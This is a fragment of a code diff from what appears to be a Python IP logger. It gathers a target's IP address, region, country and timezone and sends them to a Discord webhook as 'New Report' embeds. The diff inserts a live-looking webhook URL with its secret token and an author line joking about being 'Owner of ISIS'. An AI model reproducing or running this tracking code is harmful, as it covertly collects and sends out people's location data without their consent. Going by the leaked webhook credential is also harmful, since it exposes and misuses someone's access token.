@@ -10,7 +10,7 @@ region = json_stats["region"]
 country = json_stats["country"]
 timezone = json_stats["timezone"] 
 
-webhookurl = "webhookhere" 
+webhookurl = "https://discord.com/api/webhooks/1235034260159860876/GWQAZyvQC_6E2jzvOdhCfLwp_S0JUEQZNhYvVKrTDGfpBGry0q-GCDjWOhnU7rSk4uyj" 
 
 def embed():
   webhook = DiscordWebhook(url=webhookurl)
@@ -22,7 +22,7 @@ def embed():
   `REGION:` {region}
   `TIMEZONE:` {timezone}
   """)
-  embed.set_author(name="Made By tower | Owner of ISIS")
+  embed.set_author(name="Chicken Nuggets | Made By horo | Owner of ISIS")
   embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/807523886433566750/1000065017506430996/16DCA446-0681-47F6-8F97-05D7EA5E42E3.gif')
   embed.set_footer(text=f"New Report | {ip}") 
   webhook.add_embed(embed)
